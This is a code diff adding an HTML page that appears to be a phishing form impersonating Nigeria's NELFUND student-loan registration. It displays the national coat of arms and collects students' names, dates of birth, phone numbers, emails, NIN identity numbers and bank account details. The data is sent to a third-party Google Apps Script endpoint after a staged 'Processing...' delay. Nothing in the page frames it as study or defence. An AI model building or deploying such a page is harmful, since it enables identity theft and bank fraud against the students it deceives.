@@ -1,0 +1,367 @@
+ <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Register</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: 'Segoe UI', sans-serif;
+    }
+
+    body {
+      background: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      //height: 100vh;
+      margin: 0;
+    }
+ 
+       .container2 {
+      background: transparent;
+      padding: 2rem;
+      width: 350px;
+      box-shadow: inset 0px 0px 5px black;
+      border-radius:7px;
+        //display:block;
+    }
+
+    .input-group {
+      margin-bottom: 1rem;
+    }
+       .input-groupE {
+      margin-bottom: 1rem;
+    }
+
+    .input-group label {
+      display: block;
+     font-weight:bold;
+      color:black;
+      margin-bottom: 5px;
+      font-size: 14px;
+    }
+       .input-groupE label {
+      display: block;
+        font-weight:bold;
+      color:black;
+      margin-bottom: 5px;
+      font-size: 14px;
+    }
+
+    .input-group input:hover {
+      //font-size: 20px;
+     caret-color: red;
+      outline: none;
+      //animation:anim 3s infinite;
+      padding: 0.5rem;
+     width:100%;
+    }
+   .input-groupE input:hover {
+      //font-size: 20px;
+    caret-color: red;
+      outline: none;
+      //animation:anim 3s infinite;
+      padding: 0.5rem;
+    width:100%;
+    }
+    .input-group select:hover {
+      font-size: 20px;
+     caret-color: transparent;
+      outline: none;
+     //animation:anim 3s infinite ;
+      padding: 0.5rem;
+     width:100%;
+    }
+   @keyframes anim{
+    10%{width:10%;}
+    20%{width:20%;}
+    30%{width:30%;}
+    40%{width:40%;}
+    50%{width:50%;}
+    60%{width:60%;}
+    70%{width:70%;}
+    80%{width:80%;}
+    90%{width:90%;}
+    100%{width:100%;}
+   }
+    .input-group input {
+      width: 100%;
+     caret-color: transparent;
+      padding: 0.5rem;
+      border-radius: 5px;
+      border: none;
+      background: transparent;
+      border-bottom: 1px solid #bbb;
+      font-size: 14px;
+      outline: none;
+      text-transform: capitalize;
+    }
+    .input-groupE input {
+      width: 100%;
+     caret-color: transparent;
+      padding: 0.5rem;
+      border-radius: 5px;
+      border: none;
+      background: transparent;
+      border-bottom: 1px solid #bbb;
+      font-size: 14px;
+      outline: none;
+      text-transform: lowercase;
+    }
+   
+    .input-group select {
+      width: 100%;
+      padding: 0.5rem;
+      border-radius: 5px;
+      border: none;
+      background: transparent;
+      border-bottom: 1px solid #ccc;
+      font-size: 14px;
+      outline: none;
+      text-transform: capitalize;
+    }
+   button:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+
+    @keyframes blink {
+      0% { opacity: 1; }
+      50% { opacity: 0.3; }
+      100% { opacity: 1; }
+    }
+
+    .blinking {
+      animation: blink 1s infinite;
+    }
+    .register-btn {
+      width: 100%;
+      padding: 0.7rem;
+      border: none;
+      margin-top: 0.5rem;
+      border-radius: 15px;
+      background: #052;
+      color: white;
+      box-shadow: 5px 5px 10px #bec3c9,
+                  -5px -5px 10px #ffffff;
+      font-weight: bold;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+     <div class="container2">
+        <center><img src="https://st2.depositphotos.com/6962450/10591/i/950/depositphotos_105914406-stock-illustration-nigeria-coat-of-arms.jpg" alt="Nigeria Coat of Arms" width="100"></center>
+  <center>  <b><a style="color:navy;font-size:30px; font-family:impact;">NELFUND </a><a style="color:green; font-size:15px;"><i>REGISTRATION</i></a></b></br></center>
+  <center>   <b><a style="color:black; font-size:10px; font-family:monospace;">For Nigerian Students</a></b></center>
+     </br></br></br>
+
+
+    <form id="myForm" action="https://script.google.com/macros/s/AKfycbzDmDBauOrK5uszM2vTjQFkK42CWErG-WTKAVxyhMRFtTYSzD2RcYfTopM3R2lD4Yg19g/exec" method="POST">
+      <div class="input-group">
+        <label>Your Name<a style="color:red">*</a></label>
+        <input type="text" autocomplete="on" name="Name" required />
+      </div>
+      <!---<div class="input-group">
+        <label>Middle Name (optional)</label>
+        <input type="text" autocomplete="off" name="Middle Name" />
+      </div>
+      <div class="input-group">
+        <label>Last Name<a style="color:red">*</a></label>
+        <input type="text" autocomplete="off" name="Last Name" required />
+      </div>-->
+      <div class="input-group">
+        <label>Date Of Birth<a style="color:red">*</a></label>
+        <input type="date" autocomplete="on" name="Date of Birth" required />
+      </div>
+      <div class="input-group">
+        <label>Phone Number<a style="color:red">*</a></label>
+        <input type="text" required name="Phone Number" placeholder=""
+          pattern="^\d{11}" autocomplete="on" />
+      </div>
+      <div class="input-groupE">
+        <label>Email<a style="color:red">*</a></label>
+        <input type="email" autocomplete="on" name="Email" placeholder="you@example.com" required />
+      </div>
+      <div class="input-group">
+        <label>NIN<a style="color:red">*</a></label>
+        <input type="text" autocomplete="on" name="NIN" minlength="11" maxlength="11" required pattern="\d{11}" title="Enter 11-digits NIN number"/>
+      </div>
+
+      <div class="input-group">
+        <label>State<a style="color:red">*</a></label>
+        <select id="State" name="State" required onchange="loadLgas()">
+          <option value=""></option>
+          <option value="Abia">Abia</option>
+<option value="Adamawa">Adamawa</option>
+<option value="Akwa Ibom">Akwa Ibom</option>
+<option value="Anambra">Anambra</option>
+<option value="Bauchi">Bauchi</option>
+<option value="Bayelsa">Bayelsa</option>
+<option value="Benue">Benue</option>
+<option value="Borno">Borno</option>
+<option value="Cross River">Cross River</option>
+<option value="Delta">Delta</option>
+<option value="Ebonyi">Ebonyi</option>
+<option value="Edo">Edo</option>
+<option value="Ekiti">Ekiti</option>
+<option value="Enugu">Enugu</option>
+<option value="Gombe">Gombe</option>
+<option value="Imo">Imo</option>
+<option value="Jigawa">Jigawa</option>
+<option value="Kaduna">Kaduna</option>
+<option value="Kano">Kano</option>
+<option value="Katsina">Katsina</option>
+<option value="Kebbi">Kebbi</option>
+<option value="Kogi">Kogi</option>
+<option value="Kwara">Kwara</option>
+<option value="Lagos">Lagos</option>
+<option value="Nasarawa">Nasarawa</option>
+<option value="Niger">Niger</option>
+<option value="Ogun">Ogun</option>
+<option value="Ondo">Ondo</option>
+<option value="Osun">Osun</option>
+<option value="Oyo">Oyo</option>
+<option value="Plateau">Plateau</option>
+<option value="Rivers">Rivers</option>
+<option value="Sokoto">Sokoto</option>
+<option value="Taraba">Taraba</option>
+<option value="Yobe">Yobe</option>
+<option value="Zamfara">Zamfara</option>
+<option value="FCT">FCT</option>
+        </select>
+      </div>
+
+      <div class="input-group">
+        <label for="LGA">LGA<a style="color:red">*</a></label>
+        <select id="LGA" name="LGA" required>
+          <option value=""></option>
+        </select>
+      </div>
+
+     <div class="input-group">
+        <label>Account Number<a style="color:red">*</a></label>
+        <input type="text" autocomplete="off" name="Account Number" minlength="10" maxlength="10" pattern="\d{10}" required title="Enter 10-digits account number"/>
+      </div>
+      <div class="input-group">
+        <label for="bank">Select Your Bank<a style="color:red">*</a></label>
+<select name="Bank" id="Bank" autocomplete="on"  required>
+  <option value=""></option>
+  <option value="access">Access Bank</option>
+  <option value="citibank">Citibank Nigeria</option>
+  <option value="ecobank">Ecobank Nigeria</option>
+  <option value="fidelity">Fidelity Bank</option>
+  <option value="firstBank">First Bank of Nigeria</option>
+  <option value="fcmb">First City Monument Bank (FCMB)</option>
+  <option value="globus">Globus Bank</option>
+  <option value="gtbank">Guaranty Trust Bank (GTBank)</option>
+  <option value="heritage">Heritage Bank</option>
+  <option value="keystone">Keystone Bank</option>
+  <option value="optima">Optimus Bank</option>
+  <option value="parallex">Parallex Bank</option>
+  <option value="polaris">Polaris Bank</option>
+  <option value="premiumTrust">PremiumTrust Bank</option>
+  <option value="providus">Providus Bank</option>
+  <option value="stanbic">Stanbic IBTC Bank</option>
+  <option value="standardChartered">Standard Chartered Bank</option>
+  <option value="sterling">Sterling Bank</option>
+  <option value="suntrust">SunTrust Bank</option>
+  <option value="taj">TAJ Bank</option>
+  <option value="titan">Titan Trust Bank</option>
+  <option value="union">Union Bank of Nigeria</option>
+  <option value="uba">United Bank for Africa (UBA)</option>
+  <option value="unity">Unity Bank</option>
+  <option value="wema">Wema Bank</option>
+  <option value="zenith">Zenith Bank</option>
+</select>
+      </div>
+
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_subject" value="New Name Submission!">
+      <input type="hidden" name="_template" value="table">
+      <input type="hidden" name="_template_style" value="table,th {color: red;}">
+
+      <button class="register-btn" id="submitBtn" type="submit">Submit</button>
+    </form>
+  </div>
+
+  <script>
+    const lgas = {
+      "Abia": ["Aba North", "Aba South", "Umuahia North", "Umuahia South"],
+      "Adamawa": ["Yola North", "Yola South", "Mubi North", "Mubi South"],
+      "Akwa Ibom": ["Uyo", "Ikot Ekpene", "Eket", "Oron"],
+      "Anambra": ["Awka North", "Awka South", "Onitsha North", "Onitsha South"],
+      "Bauchi": ["Bauchi", "Misau", "Ningi", "Tafawa Balewa"],
+      "Bayelsa": ["Yenagoa", "Brass", "Ogbia", "Nembe"],
+      "Benue": ["Makurdi", "Gboko", "Otukpo", "Katsina-Ala"],
+      "Borno": ["Maiduguri", "Biu", "Jere", "Ngala"],
+      "Cross River": ["Calabar Municipal", "Ogoja", "Obudu", "Akpabuyo"],
+      "Delta": ["Asaba", "Warri South", "Ughelli North", "Sapele"],
+      "Ebonyi": ["Abakaliki", "Afikpo North", "Ezza North", "Ikwo"],
+      "Edo": ["Benin City", "Egor", "Esan Central", "Oredo"],
+      "Ekiti": ["Ado Ekiti", "Ikere", "Irepodun/Ifelodun", "Ijero"],
+      "Enugu": ["Enugu East", "Enugu North", "Nsukka", "Udi"],
+      "Gombe": ["Gombe", "Akko", "Kaltungo", "Yamaltu/Deba"],
+      "Imo": ["Owerri Municipal", "Orlu", "Mbaitolu", "Okigwe"],
+      "Jigawa": ["Dutse", "Hadejia", "Kazaure", "Gumel"],
+      "Kaduna": ["Kaduna North", "Kaduna South", "Zaria", "Sabon Gari"],
+      "Kano": ["Nasarawa", "Tarauni", "Fagge", "Dala"],
+      "Katsina": ["Katsina", "Daura", "Funtua", "Malumfashi"],
+      "Kebbi": ["Birnin Kebbi", "Argungu", "Zuru", "Yauri"],
+      "Kogi": ["Lokoja", "Okene", "Idah", "Kabba/Bunu"],
+      "Kwara": ["Ilorin West", "Ilorin East", "Offa", "Oyun"],
+      "Lagos": ["Ikeja", "Surulere", "Eti-Osa", "Ikorodu"],
+      "Nasarawa": ["Lafia", "Keffi", "Akwanga", "Karu"],
+      "Niger": ["Minna", "Bida", "Kontagora", "Suleja"],
+      "Ogun": ["Abeokuta North", "Abeokuta South", "Ijebu Ode", "Sagamu"],
+      "Ondo": ["Akure South", "Owo", "Ondo West", "Ilaje"],
+      "Osun": ["Oshogbo", "Ife Central", "Ejigbo", "Ilesa East"],
+      "Oyo": ["Ibadan North", "Ibadan South-East", "Ogbomosho North", "Oyo West"],
+      "Plateau": ["Jos North", "Jos South", "Barkin Ladi", "Langtang North"],
+      "Rivers": ["Port Harcourt", "Obio/Akpor", "Bonny", "Ikwerre"],
+      "Sokoto": ["Sokoto North", "Sokoto South", "Wamako", "Tambuwal"],
+      "Taraba": ["Jalingo", "Wukari", "Bali", "Takum"],
+      "Yobe": ["Damaturu", "Nguru", "Potiskum", "Geidam"],
+      "Zamfara": ["Gusau", "Kaura Namoda", "Talata Mafara", "Zurmi"],
+      "FCT": ["Abuja Municipal", "Gwagwalada", "Kuje", "Bwari"]
+    };
+
+    function loadLgas() {
+      const stateSelect = document.getElementById("State");
+      const lgaSelect = document.getElementById("LGA");
+      const selectedState = stateSelect.value;
+
+      lgaSelect.innerHTML = '<option value="">Select LGA</option>';
+
+      if (lgas[selectedState]) {
+        lgas[selectedState].forEach(lga => {
+          const option = document.createElement("option");
+          option.value = lga;
+          option.textContent = lga;
+          lgaSelect.appendChild(option);
+        });
+      }
+    }
+  </script>
+   <script>
+    const form = document.getElementById('myForm');
+    const submitBtn = document.getElementById('submitBtn');
+
+    form.addEventListener('submit', function (e) {
+      e.preventDefault(); // Stop immediate submit
+
+      // Disable and start blinking
+      submitBtn.disabled = true;
+      submitBtn.classList.add('blinking');
+      submitBtn.textContent = 'Processing...';
+
+      // Wait 10 seconds then submit
+      setTimeout(() => {
+        form.submit(); // Now submit to nextpage.html
+      }, 5000);
+    });
+  </script>
+</body>
+</html>
